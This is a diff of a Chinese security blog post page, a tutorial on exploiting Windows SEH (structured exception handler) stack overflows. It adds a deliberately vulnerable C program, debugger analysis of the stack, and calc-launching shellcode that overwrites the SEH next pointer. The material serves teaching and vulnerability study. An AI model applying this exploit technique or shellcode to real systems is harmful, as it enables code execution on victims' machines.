@@ -6,25 +6,28 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hello! CytQ">
-    <title>通关栈溢出（三）：SEH、SafeSEH - Hello! CytQ</title>
+    <title>通关栈溢出（三）：攻击SEH - Hello! CytQ</title>
     <meta name="author" content="CytQ">
     
     
     
         <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
     
-    <meta name="description" content="本文主要介绍利用SEH来实现栈溢出漏洞利用，以及SafeSEH相关的介绍 OS： Windows XP SP2, Window 7 Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0">
+    <meta name="description" content="本文主要介绍利用SEH来实现栈溢出 OS： Windows XP SP2, Window 7，Windows 2000 Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0">
 <meta name="keywords" content="漏洞,通关,专栏">
 <meta property="og:type" content="blog">
-<meta property="og:title" content="通关栈溢出（三）：SEH、SafeSEH">
+<meta property="og:title" content="通关栈溢出（三）：攻击SEH">
 <meta property="og:url" content="http://imlzq.com/2018/08/10/stackoverflow_seh/index.html">
 <meta property="og:site_name" content="Hello! CytQ">
-<meta property="og:description" content="本文主要介绍利用SEH来实现栈溢出漏洞利用，以及SafeSEH相关的介绍 OS： Windows XP SP2, Window 7 Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0">
+<meta property="og:description" content="本文主要介绍利用SEH来实现栈溢出 OS： Windows XP SP2, Window 7，Windows 2000 Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-08-27T09:46:07.063Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_seh2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_seh3.png">
+<meta property="og:updated_time" content="2018-08-27T12:04:17.304Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="通关栈溢出（三）：SEH、SafeSEH">
-<meta name="twitter:description" content="本文主要介绍利用SEH来实现栈溢出漏洞利用，以及SafeSEH相关的介绍 OS： Windows XP SP2, Window 7 Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0">
+<meta name="twitter:title" content="通关栈溢出（三）：攻击SEH">
+<meta name="twitter:description" content="本文主要介绍利用SEH来实现栈溢出 OS： Windows XP SP2, Window 7，Windows 2000 Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_seh2.png">
     
     
         
@@ -201,7 +204,7 @@
         <div class="post-header main-content-wrap text-left">
     
         <h1 class="post-title" itemprop="headline">
-            通关栈溢出（三）：SEH、SafeSEH
+            通关栈溢出（三）：攻击SEH
         </h1>
     
     
@@ -219,8 +222,8 @@
     
     <div class="post-content markdown" itemprop="articleBody">
         <div class="main-content-wrap">
-            <p>本文主要介绍利用SEH来实现栈溢出漏洞利用，以及SafeSEH相关的介绍</p>
-<p>OS： Windows XP SP2, Window 7</p>
+            <p>本文主要介绍利用SEH来实现栈溢出</p>
+<p>OS： Windows XP SP2, Window 7，Windows 2000</p>
 <p>Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0</p>
 <a id="more"></a>    
 <h2 id="S-E-H"><a href="#S-E-H" class="headerlink" title="S.E.H"></a>S.E.H</h2><blockquote>
@@ -251,7 +254,7 @@
 <td>局部变量</td>
 </tr>
 <tr>
-<td>security_cookie       gs校验码，操作系统用于检测是否有溢出，需要操作系统支持且编译时开启</td>
+<td>security_cookie ：      gs校验码，操作系统用于检测是否有溢出，需要操作系统支持且编译时开启</td>
 </tr>
 <tr>
 <td>入栈寄存器</td>
@@ -270,6 +273,17 @@
 </tr>
 </tbody>
 </table>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">""</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HackExceptionHandler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"got an exception, press Enter to kill process\n"</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="keyword">int</span> zero = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">		zero = <span class="number">4</span> / zero;</span><br><span class="line">	&#125;</span><br><span class="line">	__except(HackExceptionHandler())</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	test(shellcode);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>拖入ollydbg动态调试，选择View下的SEH chain选项，就能看到当前栈中的SEH表的情况。</p>
+<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_seh2.png" alt="seh chain"></p>
+<p>从图中能看出，0012FF18是离栈顶最近的SEH。</p>
+<p>接着我们在调试的栈窗口看到的数据也能验证我们的想法：</p>
+<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_seh3.png" alt="seh stack"></p>
+<p>地址0012ff1c的位置已经被OD自动标记为了SEhandler，address-4就是它的next指针所处的位置，与SEH chain中看到的数据一样。</p>
+<p>另外，从上图的stack布局能看出来，buf的起始地址为12FF40，最终地址为0012FF0C，局部变量zero的位置是12FF10，只要我们能够覆盖buf到12FF18，让它指向shellcode，那么在发生异常时，就会执行到恶意代码。</p>
+<p>因此，构造shellcode如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] = </span><br><span class="line">    <span class="comment">// 下面是弹出计算器的shellcode</span></span><br><span class="line"> <span class="string">"\x83\xEC\x40\x33\xDB\x53\x68\x2E\x65\x78\x65"</span></span><br><span class="line"> <span class="string">"\x68\x63\x61\x6C\x63\x8B\xC4\x53\x50\xB9\x4D"</span></span><br><span class="line"> <span class="string">"\x11\x86\x7C\x8B\xC1\xFF\xD0\x33\xDB\x53\xB8"</span></span><br><span class="line"> <span class="string">"\xA2\xCA\x81\x7C\x8B\xC0\xFF\xD0"</span></span><br><span class="line"> <span class="string">"\x90....."</span><span class="comment">//使用90填充剩下的空间</span></span><br><span class="line"> <span class="string">"\x40\xFF\x12\x00"</span> <span class="comment">// 指向buf的起始地址，这一行会覆盖掉SEH的next指针</span></span><br></pre></td></tr></table></figure>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以上就是SEH的攻击方法，因为SEH本身就放在栈中，那么发生缓冲区溢出时攻击者是一定能控制SEH的next的，这也让SEH的攻击成为了栈溢出的一种经典方法。</p>
 
             
 
@@ -325,7 +339,7 @@
             
             
             <li class="post-action hide-xs">
-                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/08/10/stackoverflow_seh/&amp;title=通关栈溢出（三）：SEH、SafeSEH" title="Share on QQ">
+                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/08/10/stackoverflow_seh/&amp;title=通关栈溢出（三）：攻击SEH" title="Share on QQ">
                     <i class="fa fa-qq" aria-hidden="true"></i>
                 </a>
             </li>
@@ -426,7 +440,7 @@
             
             
             <li class="post-action hide-xs">
-                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/08/10/stackoverflow_seh/&amp;title=通关栈溢出（三）：SEH、SafeSEH" title="Share on QQ">
+                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/08/10/stackoverflow_seh/&amp;title=通关栈溢出（三）：攻击SEH" title="Share on QQ">
                     <i class="fa fa-qq" aria-hidden="true"></i>
                 </a>
             </li>
@@ -483,7 +497,7 @@
             
             
             <li class="share-option">
-                <a class="share-option-btn" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/08/10/stackoverflow_seh/&amp;title=通关栈溢出（三）：SEH、SafeSEH">
+                <a class="share-option-btn" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/08/10/stackoverflow_seh/&amp;title=通关栈溢出（三）：攻击SEH">
                     <i class="fa fa-qq" aria-hidden="true"></i><span>Share on QQ</span>
                 </a>
             </li>
